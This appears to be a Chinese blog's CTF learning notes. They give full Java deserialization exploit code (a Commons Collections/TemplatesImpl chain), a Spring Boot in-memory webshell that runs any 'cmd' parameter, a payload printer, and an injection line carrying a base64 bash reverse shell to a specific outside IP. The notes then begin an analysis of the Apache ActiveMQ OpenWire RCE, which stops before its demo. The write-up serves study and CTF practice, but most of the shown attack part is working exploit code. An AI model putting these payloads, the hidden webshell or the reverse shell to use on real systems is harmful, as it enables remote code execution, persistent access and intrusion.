<h3 id="hashtable"><a href="#hashtable" class="headerlink" title="hashtable"></a>hashtable</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.do_you_know_cc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.DefaultedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URLEncoder;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">impl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>((AbstractTranslet.class)));</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        cc.makeClassInitializer().insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] classbyte = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] code = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classbyte&#125;;</span><br><span class="line">        setFieldValue(impl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        setFieldValue(impl, <span class="string">&quot;_bytecodes&quot;</span>, code);</span><br><span class="line">        setFieldValue(impl, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(impl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Hashtable hashtable=<span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        HashMap map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        HashMap hashmap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(TrAXFilter.class,<span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        hashmap.put(<span class="string">&quot;baicany&quot;</span>,TrAXFilter.class);</span><br><span class="line">        InstantiateTransformer transformer=<span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;impl&#125;);</span><br><span class="line">        DefaultedMap demap=(DefaultedMap) DefaultedMap.decorate(hashmap,<span class="string">&quot;fuck&quot;</span>);</span><br><span class="line">        hashtable.put(map,<span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        hashtable.put(demap,<span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> DefaultedMap.class.getDeclaredField(<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(demap,transformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(hashtable);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ob</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line"><span class="comment">//        System.out.println(URLEncoder.encode(new String(Base64.getEncoder().encode(barr.toByteArray()))));</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldName,Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>成功弹出计算器,现在就是怎么写内存马了</p>
<h3 id="内存马exp"><a href="#内存马exp" class="headerlink" title="内存马exp"></a>内存马exp</h3><p>参考：<a href="https://boogipop.com/2023/03/02/SpringBoot3.x%E5%86%85%E5%AD%98%E9%A9%AC%E6%9E%84%E9%80%A0%E6%80%9D%E8%B7%AF/"></a>获取RequestMappingInfo</p>
<p>实例化RequestMappingInfo对象的⽅式已被弃⽤ </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilController</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilController</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 1. 利用spring内部方法获取context</span></span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// 2. 从context中获得 RequestMappingHandlerMapping 的实例</span></span><br><span class="line">        <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">        <span class="comment">// 3. 通过反射获得自定义 controller 中的 Method 对象</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> EvilController.class.getMethod(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">// 4. 定义访问 controller 的 URL 地址</span></span><br><span class="line">        <span class="type">PatternsRequestCondition</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PatternsRequestCondition</span>(<span class="string">&quot;/shell&quot;</span>);</span><br><span class="line">        <span class="comment">// 5. 定义允许访问 controller 的 HTTP 方法（GET/POST）</span></span><br><span class="line">        <span class="type">RequestMethodsRequestCondition</span> <span class="variable">ms</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMethodsRequestCondition</span>();</span><br><span class="line">        <span class="comment">// 6. 在内存中动态注册 controller</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">configField</span> <span class="operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">        configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span> (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">        <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> RequestMappingInfo.paths(<span class="string">&quot;/shell&quot;</span>).options(config).build();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">EvilController</span> <span class="variable">springBootMemoryShellOfController</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilController</span>(<span class="string">&quot;aaaaaaa&quot;</span>);</span><br><span class="line">        mappingHandlerMapping.registerMapping(info, springBootMemoryShellOfController, method);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilController</span><span class="params">(String test)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 获取request和response对象</span></span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">        <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span><br><span class="line">        <span class="comment">// 获取cmd参数并执行命令</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(command != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                java.io.<span class="type">PrintWriter</span> <span class="variable">printWriter</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">                <span class="type">String</span> <span class="variable">o</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                ProcessBuilder p;</span><br><span class="line">                <span class="keyword">if</span>(System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>))&#123;</span><br><span class="line">                    p = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, command&#125;);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    p = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, command&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                java.util.<span class="type">Scanner</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(p.start().getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                o = c.hasNext() ? c.next(): o;</span><br><span class="line">                c.close();</span><br><span class="line">                printWriter.write(o);</span><br><span class="line">                printWriter.flush();</span><br><span class="line">                printWriter.close();</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception ignored)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.do_you_know_cc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.DefaultedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URLEncoder;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">impl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.example.EvilController&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] classbyte = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] code = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classbyte&#125;;</span><br><span class="line"></span><br><span class="line">        setFieldValue(impl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        setFieldValue(impl, <span class="string">&quot;_bytecodes&quot;</span>, code);</span><br><span class="line">        setFieldValue(impl, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(impl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Hashtable hashtable=<span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        HashMap map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        HashMap hashmap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(TrAXFilter.class,<span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        hashmap.put(<span class="string">&quot;baicany&quot;</span>,TrAXFilter.class);</span><br><span class="line">        InstantiateTransformer transformer=<span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;impl&#125;);</span><br><span class="line">        DefaultedMap demap=(DefaultedMap) DefaultedMap.decorate(hashmap,<span class="string">&quot;fuck&quot;</span>);</span><br><span class="line">        hashtable.put(map,<span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        hashtable.put(demap,<span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> DefaultedMap.class.getDeclaredField(<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(demap,transformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(hashtable);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line"><span class="comment">//        ByteArrayInputStream in = new ByteArrayInputStream(barr.toByteArray());</span></span><br><span class="line"><span class="comment">//        ObjectInputStream ois = new ObjectInputStream(in);</span></span><br><span class="line"><span class="comment">//        Object ob = (Object) ois.readObject();</span></span><br><span class="line">        System.out.println(URLEncoder.encode(<span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(barr.toByteArray()))));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldName,Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>就cc7+cc3用没被禁用的工厂类也行</p>
<p>只是先粗略的写一下,后面改进,毕竟我代码写的很垃圾,后面也会分析这条链子改进代码好看一点,之前欠的东西还没补完,先狠狠补一波前面的</p>
<h1 id="pain"><a href="#pain" class="headerlink" title="pain"></a>pain</h1><p>pain注入,发现2种解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@java</span>.lang.\u0052untime<span class="meta">@g</span>\u0065tRuntime().\u0065xec(<span class="string">&#x27;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwMS40Mi41Mi4xMTQvOTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>unicode编码和直接读文件<br>(#a&#x3D;new java.util.Scanner(new java.io.File(“&#x2F;flag”)).next())</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>ActiveMQ</title>
    <url>/2023/11/08/activemq/</url>
    <content><![CDATA[<p>纯小白只能跟在大哥们的走o(╥﹏╥)o</p>
<p>主要看大哥的,感谢大哥Nivia,640,ycx</p>
<p><a href="https://exp10it.cn/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/">https://exp10it.cn/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/</a></p>
<h1 id="Apache-ActiveMQ-版本-5-18-3-RCE-分析"><a href="#Apache-ActiveMQ-版本-5-18-3-RCE-分析" class="headerlink" title="Apache ActiveMQ (版本 &lt; 5.18.3) RCE 分析"></a>Apache ActiveMQ (版本 &lt; 5.18.3) RCE 分析</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>java 1.8 331</p>
<p>activemq 5.15.15<a href="https://activemq.apache.org/activemq-5015015-release">ActiveMQ (apache.org)</a></p>
<p>idea远程调试</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>跟在大哥,首先看历史提交吧</p>
<p><a href="https://github.com/apache/activemq/commit/958330df26cf3d5cdb63905dc2c6882e98781d8f">https://github.com/apache/activemq/commit/958330df26cf3d5cdb63905dc2c6882e98781d8f</a></p>
<p><a href="https://github.com/apache/activemq/blob/1d0a6d647e468334132161942c1442eed7708ad2/activemq-openwire-legacy/src/main/java/org/apache/activemq/openwire/v4/ExceptionResponseMarshaller.java">https://github.com/apache/activemq/blob/1d0a6d647e468334132161942c1442eed7708ad2/activemq-openwire-legacy/src/main/java/org/apache/activemq/openwire/v4/ExceptionResponseMarshaller.java</a></p>
<p>发现多了一个类,其实也就都用了一个方法</p>
<p><img src="https://baicany.github.io/images/image-20231107224923275.png" alt="image-20231107224923275"></p>
<p>在org.apache.activemq.openwire.v1.BaseDataStreamMarshaller 中createThrowable方法用了此类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(className, <span class="literal">false</span>, BaseDataStreamMarshaller.class.getClassLoader());</span><br><span class="line">            </span><br><span class="line">            OpenWireUtil.validateIsThrowable(clazz);</span><br><span class="line">            </span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;);</span><br><span class="line">            <span class="keyword">return</span> (Throwable)constructor.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;message&#125;);</span><br><span class="line">        &#125; </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> e;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>看看这个类中这个方法在哪里调用了</p>
<p>发现在v1这个包里只有</p>
<p><code>tightUnmarsalThrowable / looseUnmarsalThrowable</code>调用了说明子类并没有重写这个方法,应该还是会通过这2个方法来调用createthrow</p>
<p>全局搜搜哪里用了这个2方法发现v1包里只有2个类</p>
<p>一个是ExceptionResponseMarshaller另一个是ConnectionErrorMarshaller</p>
<p>ExceptionResponseMarshaller 顾名思义就是对 ExceptionResponse 进行序列化&#x2F;反序列化的类</p>
<p>ExceptionResponse 的定义如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.activemq.command;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExceptionResponse</span> <span class="keyword">extends</span> <span class="title class_">Response</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span> <span class="variable">DATA_STRUCTURE_TYPE</span> <span class="operator">=</span> <span class="number">31</span>;</span><br><span class="line">    Throwable exception;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ExceptionResponse</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ExceptionResponse</span><span class="params">(Throwable e)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.setException(e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span> <span class="title function_">getDataStructureType</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">31</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Throwable <span class="title function_">getException</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.exception;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setException</span><span class="params">(Throwable exception)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.exception = exception;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isException</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ExceptionResponseMarshaller </p>
<p>其对应的<code>tightUnmarshal</code>和<code>looseUnmarshal</code>方法会调用对应的throwable</p>
<p>这里看tightUnmarshal方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">info.setException((java.lang.Throwable) tightUnmarsalThrowable(wireFormat, dataIn, bs));</span><br></pre></td></tr></table></figure>

<p>先跟进tightUnmarsalThrowable</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (bs.readBoolean()) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">clazz</span> <span class="operator">=</span> tightUnmarshalString(dataIn, bs);</span><br><span class="line">    <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> tightUnmarshalString(dataIn, bs);</span><br><span class="line">    <span class="type">Throwable</span> <span class="variable">o</span> <span class="operator">=</span> createThrowable(clazz, message);</span><br></pre></td></tr></table></figure>

<p>这里传入的BooleanStream bs是一个存储bool值的数组,</p>
<p>这里会获取传入类的class和message信息,然后获取这个类有一个string参数的构造器再实例化,emmm这个一个类的string,正好对应之前学postgresql的利用类</p>
<p><code>org.springframework.context.support.ClassPathXmlApplicationContext</code></p>
<p>然后看大哥的…这里是读序列化的信息,现在是看怎么序列化的了吧</p>
<p>找到对应的<code>tightMarshalThrowable</code> </p>
<p><img src="https://baicany.github.io/images/image-20231108113351511.png" alt="image-20231108113351511"></p>
<p>o 就是 ExceptionResponse 里面的 exception 字段 (继承了 Throwable), 然后分别将 o 的 className 和 message 写入序列化流</p>
<p>我们只需要构造一个 ExceptionResponse 然后发给 ActiveMQ 服务器, 之后 ActiveMQ 会自己调用 unmarshal, 最后触发 createThrowable</p>
<p>看大哥的demo</p>
